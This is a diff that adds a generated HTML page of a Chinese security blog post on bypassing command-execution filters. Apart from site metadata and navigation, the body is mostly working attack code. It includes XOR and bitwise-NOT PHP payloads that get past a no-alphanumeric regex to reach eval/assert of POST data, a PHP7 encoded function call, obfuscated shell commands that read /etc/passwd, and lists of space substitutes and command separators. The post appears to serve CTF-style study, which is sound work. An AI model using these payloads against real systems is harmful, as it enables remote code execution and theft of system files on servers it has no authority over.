@@ -1,0 +1,942 @@
+
+
+<!DOCTYPE html>
+<html lang="en" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#265689e3">
+  <meta name="author" content="Pho3n1x">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="命令执行无字母数字绕过12345678910111213141516171819202122232425if(!preg_match(&amp;#x27;&#x2F;[a-z0-9]&#x2F;is&amp;#x27;,$_GET[&amp;#x27;shell&amp;#x27;]))&amp;#123;  eval($_GET[&amp;#x27;shell&amp;#x27;]);&amp;#125;1.异或$_&#x3D;(&amp;#x27;%01&amp;#x27;^&amp;#x27;&#96;&amp;#x27;">
+<meta property="og:type" content="article">
+<meta property="og:title" content="命令执行绕过">
+<meta property="og:url" content="https://pho3n1x-web.github.io/2022/07/14/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E7%BB%95%E8%BF%87/index.html">
+<meta property="og:site_name" content="Pho3n1x&#39;s Blog">
+<meta property="og:description" content="命令执行无字母数字绕过12345678910111213141516171819202122232425if(!preg_match(&amp;#x27;&#x2F;[a-z0-9]&#x2F;is&amp;#x27;,$_GET[&amp;#x27;shell&amp;#x27;]))&amp;#123;  eval($_GET[&amp;#x27;shell&amp;#x27;]);&amp;#125;1.异或$_&#x3D;(&amp;#x27;%01&amp;#x27;^&amp;#x27;&#96;&amp;#x27;">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAicNKsm8OvN6UJUlLiaMfTKqZrKEhibrQ21Rib1RLibeV7zVibdsXFmB2Ga5g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAIDETUpRLY8zGMHS8xmnRIsX82mksF0dVf7E0fWMujCjYOBXeqkC8uw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAoHBYFxInJOmiaZialyzdMiaosNfPIcvVgwZrYlVdLAuUQYO46GyiaFJ6Bg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAP4vicaXCWroBMGNjVSbGyO2icMtLyAIcb7HyCtMXLr4Ku3cMUSv4l04Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAo2hOAgvjQCiawOGCUXE8NVDSpqA1SU6icoeMA57oZU0m9ZROIztJAvfg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDA0LB5ddJMqFYP0aMVmq4ge6P2MQUrPrLz6rhWTibXkYDoXn9SYX9zODg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDArN6p9ibfSToU9pkIxicZNRGxfNeYwTlMNP7icNZVaqAQzYuScNDjZkbpA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDA1ayFtibNWWK3RlkPgicXU63tkd9LxictrySH0Gvs7PQSgvIIicTuvOtoSg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDA2TLiciagKYAa0HwZfTgR7JSkkW40EhgloVaIDH1LgkkklZAPZXR5W5LA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAnEw09POz1NpcCQ7viapX0k9mNjMOVxmY8CPNE7pw1Ricv81fd0KOX7icg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDA7PN5eXz4Hj7UfQWlibL3o4IuH4mVT4uUCztfXfP9v5GwKnicCry1k7kA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAibOqJPCqEQlzA9qiamyTOHVkpG1GCAcLjKxEgDsuf4zfKt6bfkmWv6yA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAqtibwOkeZoIKQMER8j9GxvW1J7nC8qrSzxgunWq7Nc6VVxhv3VmqjQg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAS9vG0ibYAZdpy6VKsE6wvJ2BHHwJwuJoYCBFoziboRruwuvk8rm8cgUg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAgptH94OSibkr73opl3nkM47tMymr4zDHibXgBj5OVHpRySrT3tVrBCbg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAmPcYkAlsyhSSqNzib75LVm5b0p8rnm3CNCR7WLmZL12x37YVaMhiaSdw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDALMLf8MC7300lXujw6IeicYvLn0pFCPfFNLKA0H5yApFC9nvCiafbFsHA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAyBicAPFoFIo1L6KMNpR5JWhPpNhzNoL4kMCkZhE8xpR5JTbaONGiaRYA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAwlZsh1R0nogZXTib9F22ibb6ic4PMmyyT3b2f2QQY5uxylJbDtcsJLnpw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDA6uDENZWHmMNDrFHMcAibgKbSdIhn2Bl9jET8Hu8JtjkB8CEF5bm1T5A/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAhnVFP8Ywrnk2QIZsiaZfFkkudO3iaYO6AWgm3aVjek8PZIlsyYYInTfQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAIO5Lj5XibulTFopjlZ9CumbboicdO4BjrLypibpa8HTStIDyian7y6HQnw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDApPFenjgjOmpS5U4NbLBZq0cPticldJKaTUG2yUlZnqOibUfnDCAsJ1Sg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDASlTK5MSlVRvl4jCu1fwRNGdPnywBTeVpTJbPLyiaAXSyE9C9wOeh0tg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAV4UwFsL7k2qJwSu0MDY31ssus0dXnR1lnbTZ9yvPZPouJSrXRwic0nw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAs1FsIOcNKHxUF0qvooxzgxsd2UUpXsHoHHG0u0aHUooA7TQ0FkicdWw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAghx2dbKHqenTlC2TcgKBDf8VcLxmOqyicIHvKAqvMSroIhicj98EKpibw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAuhAGBDAuNI1sGTTKR3nVbOFmzibnQ8XuD5wz8MnIFoZicAMwMV9tCkOg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDA6BaBFArsUsqXicNzFtBCuibNjxwhyNVeo0lth4q6YJRhLHqPosXrpoHA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAib3eMxxDO6qfz5cmjMhAh8zgUk3vKtT0ZLuGaFJAJ4VbXbtubWfxFmg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAGXVx4htWaX8MOGadb2hOHcicXgFicNDFUpUaNMibDQY9ffv5KhAjUPXHg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAbZFEKpbfib8ggpzZVaaElgetZenoHPYibbgIFgCTZEQrSRibe1dpOkghA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDATrsxBpFIwU453O4Lj2mYQu0ghdQhGICAibGjMTldNRnopD8JxL2FibLw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDANcXvdvFb6j5rHa2a3bEujbnJgiaibgObrCMSO8rJibgFU546BnlFHSgrg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAym5hbSicXvL2BRiaAibBIBsp01QFu4ic0sib9zCUdYbwbUCf1MP3ms4270Q/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAlewLe6MhQ3jwEibx7xia9Qjva7b8a6ibG1Ogd8CHvxXNFMKCsVdmSicRmw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAsDiaqTYPO5oZHEVtvSORgXxD1YY8OwvzaicZHpVqicW3vOjQvkLAxc1FA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDA93kRHZJujhAc10zNhGlQg9Bt4Gj5LU4VgByMuIDmnhC72gua0RATVQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDA6hz2deFGTib0PPtt2WzkFMNllicCiaYGB6xDDBsibnDbqJyiaick1MTq7jIw/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAdMib5bhRgCaibL5dibgf00ichGgSHYpp4NuDllUiaU1N4QNlVRvNpfZ1WlA/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAD3FClyNFl6stkujd7iaicbb4HFcUJtibWCtwOCP3iage4zcmopdVSdWYqg/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
+<meta property="og:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDA7Wyk3S43efk4SEDLkPtDiao9DCaicbwSFd2pB6aiaEAf3ERg2XLAmwStQ/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
+<meta property="article:published_time" content="2022-07-14T05:28:07.000Z">
+<meta property="article:modified_time" content="2022-07-14T05:28:07.000Z">
+<meta property="article:author" content="Pho3n1x">
+<meta property="article:tag" content="WAF绕过">
+<meta property="article:tag" content="rce">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="https://mmbiz.qpic.cn/mmbiz_png/XOPdGZ2MYOd3Nc9GBSUtacmMz5dKpwDAicNKsm8OvN6UJUlLiaMfTKqZrKEhibrQ21Rib1RLibeV7zVibdsXFmB2Ga5g/640?wx_fmt=png&wxfrom=5&wx_lazy=1&wx_co=1">
+  
+  
+    <meta name="referrer" content="no-referrer-when-downgrade">
+  
+  
+  <title>命令执行绕过 - Pho3n1x&#39;s Blog</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1749284_hj8rtnfg7um.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/font_1736178_lbnruvf0jn.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"pho3n1x-web.github.io","root":"/","version":"1.9.5","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[]},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"woyaola":null,"cnzz":null,"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":true}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+    <!-- Google tag (gtag.js) -->
+    <script async>
+      if (!Fluid.ctx.dnt) {
+        Fluid.utils.createScript("https://www.googletagmanager.com/gtag/js?id=", function() {
+          window.dataLayer = window.dataLayer || [];
+          function gtag() {
+            dataLayer.push(arguments);
+          }
+          gtag('js', new Date());
+          gtag('config', '');
+        });
+      }
+    </script>
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 6.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong>Pho3n1x</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/">
+                <i class="iconfont icon-home-fill"></i>
+                <span>Home</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>Archives</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/">
+                <i class="iconfont icon-category-fill"></i>
+                <span>Categories</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>Tags</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/">
+                <i class="iconfont icon-user-fill"></i>
+                <span>About</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/1322308.jpeg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="命令执行绕过"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2022-07-14 13:28" pubdate>
+          July 14, 2022 pm
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          9.5k words
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          40 mins
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">命令执行绕过</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h1 id="命令执行无字母数字绕过"><a href="#命令执行无字母数字绕过" class="headerlink" title="命令执行无字母数字绕过"></a>命令执行无字母数字绕过</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(!<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/[a-z0-9]/is&#x27;</span>,<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]))<br>&#123;<br>  <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;shell&#x27;</span>]);<br>&#125;<br><br><br><span class="hljs-number">1</span>.异或<br><span class="hljs-variable">$_</span>=(<span class="hljs-string">&#x27;%01&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%13&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%13&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%05&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%12&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%14&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>); <span class="hljs-comment">// $_=&#x27;assert&#x27;;</span><br><span class="hljs-variable">$__</span>=<span class="hljs-string">&#x27;_&#x27;</span>.(<span class="hljs-string">&#x27;%0D&#x27;</span>^<span class="hljs-string">&#x27;]&#x27;</span>).(<span class="hljs-string">&#x27;%2F&#x27;</span>^<span class="hljs-string">&#x27;`&#x27;</span>).(<span class="hljs-string">&#x27;%0E&#x27;</span>^<span class="hljs-string">&#x27;]&#x27;</span>).(<span class="hljs-string">&#x27;%09&#x27;</span>^<span class="hljs-string">&#x27;]&#x27;</span>); <span class="hljs-comment">//$__=&#x27;_POST&#x27;;</span><br><span class="hljs-variable">$___</span>=<span class="hljs-variable">$$__</span>;<br><span class="hljs-variable">$_</span>(<span class="hljs-variable">$___</span>[_]); <span class="hljs-comment">//assert($_POST[_]);</span><br><br><span class="hljs-number">2</span>.取反<br><span class="hljs-variable">$__</span>=(<span class="hljs-string">&#x27;&gt;&#x27;</span>&gt;<span class="hljs-string">&#x27;&lt;&#x27;</span>)+(<span class="hljs-string">&#x27;&gt;&#x27;</span>&gt;<span class="hljs-string">&#x27;&lt;&#x27;</span>);<br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$__</span>/<span class="hljs-variable">$__</span>;<br><span class="hljs-variable">$____</span>=<span class="hljs-string">&#x27;&#x27;</span>;<br><span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;瞰&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;和&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;和&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;的&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;半&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;始&quot;</span>;<span class="hljs-variable">$____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<br><span class="hljs-variable">$_____</span>=<span class="hljs-string">&#x27;_&#x27;</span>;<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;俯&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;瞰&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$__</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;次&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<span class="hljs-variable">$___</span>=<span class="hljs-string">&quot;站&quot;</span>;<span class="hljs-variable">$_____</span>.=~(<span class="hljs-variable">$___</span>&#123;<span class="hljs-variable">$_</span>&#125;);<br><span class="hljs-variable">$_</span>=<span class="hljs-variable">$$_____</span>;<br><span class="hljs-variable">$____</span>(<span class="hljs-variable">$_</span>[<span class="hljs-variable">$__</span>]); <span class="hljs-comment">//assert($_POST[2]);</span><br><br><span class="hljs-number">3</span>.php7<br>PHP7前是不允许用(<span class="hljs-variable">$a</span>)();这样的方法来执行动态函数的，但PHP7中增加了对此的支持。<br>(~%<span class="hljs-number">8</span>F%<span class="hljs-number">97</span>%<span class="hljs-number">8</span>F%<span class="hljs-number">96</span>%<span class="hljs-number">91</span>%<span class="hljs-number">99</span>%<span class="hljs-number">90</span>)(); -&gt;(<span class="hljs-string">&#x27;phpinfo&#x27;</span>)();<br><br></code></pre></td></tr></table></figure>
+
+
+
+<h1 id="linux常见绕过方法"><a href="#linux常见绕过方法" class="headerlink" title="linux常见绕过方法"></a>linux常见绕过方法</h1><p>[TOC]</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">cat /etc/passwd<br><span class="hljs-number">16</span>bit <span class="hljs-keyword">format</span><br><br>&#123;\c<span class="hljs-string">&#x27;&#x27;</span>\a&quot;&quot;t,/<span class="hljs-string">e&#x27;&#x27;</span>*?/?a?s??&#125;<br><br>&#123;\c<span class="hljs-string">&#x27;&#x27;</span>\a&quot;&quot;\t,/\<span class="hljs-string">e&#x27;&#x27;</span>*?/\p*\d&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<h3 id="空格过滤"><a href="#空格过滤" class="headerlink" title="空格过滤"></a>空格过滤</h3><p>&lt; 、&lt;&gt;、%20(space)、%09(tab)、$IFS$9、 ${IFS}、$IFS等</p>
+<h3 id="一些命令分隔符"><a href="#一些命令分隔符" class="headerlink" title="一些命令分隔符"></a>一些命令分隔符</h3><blockquote>
+<p>linux中：%0a 、%0d 、; 、&amp; 、| 、&amp;&amp;、||</p>
+<p>windows中：%0a、&amp;、|、%1a（一个神奇的角色，作为.bat文件中的命令分隔符）</p>
+</blockquote>
